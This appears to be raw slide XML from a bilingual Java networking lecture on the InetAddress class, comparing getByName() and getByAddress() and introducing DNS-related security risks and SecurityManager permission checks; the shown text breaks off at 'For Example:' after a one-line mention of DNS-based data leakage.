              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Creating an IPv6 Address Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">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2286000" y="298743"/>
            <a:ext cx="7409401" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Key Differences: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>() vs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="533400" y="914400"/>
          <a:ext cx="11388724" cy="2960976"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3276600"/>
                <a:gridCol w="2895600"/>
                <a:gridCol w="1447800"/>
                <a:gridCol w="3768724"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Performs DNS Lookup?</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Input</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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2000" b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Use Case</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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000">
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>getByName("google.com")</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000">
                        <a:effectLst/>
                        <a:highlight>
                          <a:srgbClr val="FFFF00"/>
                        </a:highligh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effectLst/>
                        </a:rPr>
                        <a:t>✅ Yes (resolves IP)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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Hostname</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="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effectLst/>
                        </a:rPr>
                        <a:t>When you have a domain name and need its IP.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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000">
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>getByAddress(byte[] ip)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000">
                        <a:effectLst/>
                        <a:highlight>
                          <a:srgbClr val="FFFF00"/>
                        </a:highligh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effectLst/>
                        </a:rPr>
                        <a:t>❌ No (manual IP)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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effectLst/>
                        </a:rPr>
                        <a:t>Byte array</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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effectLst/>
                        </a:rPr>
                        <a:t>When you already have the IP and want to avoid DNS.</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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sz="2000">
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                        </a:rPr>
                        <a:t>getByAddress("host", ip)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000">
                        <a:effectLst/>
                        <a:highlight>
                          <a:srgbClr val="FFFF00"/>
                        </a:highligh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effectLst/>
                        </a:rPr>
                        <a:t>❌ No (but stores hostname)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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effectLst/>
                        </a:rPr>
                        <a:t>Hostname + IP</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="200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When you want to associate a hostname with an IP manually.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2000" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>当你想手动将一个主机名与</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> IP </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>地址关联时使用。</a:t>
                      </a:r>
                      <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="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 name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="4328563"/>
            <a:ext cx="9448800" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>When to Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>()?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✔ Avoiding DNS lookups (faster initialization).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✔ Working with raw IPs (e.g., from network packets).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✔ Hardcoding IPs without relying on DNS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✔ Mocking IPs in tests without real network calls.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1"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381000" y="889844"/>
            <a:ext cx="11408834" cy="4893647"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> class does not have a public constructor </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>getAllByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>(), or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>getLocalHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Reverse DNS lookup happens when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>() is called. Throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> if the hostname cannot be resolved.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Supports both IPv4 (192.168.1.1) and IPv6 (2001:db8::1).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>When to Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>✅ Resolving domain names to IPs (DNS lookup).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>✅ Getting the local machine's IP.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>✅ Checking if a remote host is reachable (ping).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>✅ Working with network applications (e.g., sockets, HTTP clients).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="228600"/>
            <a:ext cx="10210800" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Key Points to Remember about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="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4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全问题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="440267" y="1752600"/>
            <a:ext cx="11387667" cy="3886200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>识别风险：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>欺骗、缓存中毒和未经授权的查询。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Implement safeguards using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SecurityManager</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and permission checks.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用安全管理器和权限检查实施安全措施。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>实践成果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can write secure code to validate DNS resolutions and restrict access.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>学生能够编写安全代码来验证</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解析并限制访问。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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a:xfrm>
            <a:off x="295277" y="990600"/>
            <a:ext cx="11668124" cy="495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800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Creating an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>object from a host name is not safe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress.getByName()/getAllByName()/getLocalHost() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>all have this security risk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="3477FF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>Because these creation methods require a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>lookup </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>arbitrary </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>lookups can open a hidden channel that can lead to information leakage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>It is often necessary to first test whether a host supports </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>resolution, using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>the SecurityManager </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>method:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>public void checkConnect(String hostname, int port)</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>parameter is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>. This method can check whether </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>DNS can be called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>to resolve the specified </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>hostname.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2002571" y="268069"/>
            <a:ext cx="8186857" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security Implications of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600"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228600" y="859066"/>
            <a:ext cx="5791200" cy="3692525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An attacker-controlled program could encode stolen data in DNS queries. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For Example: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
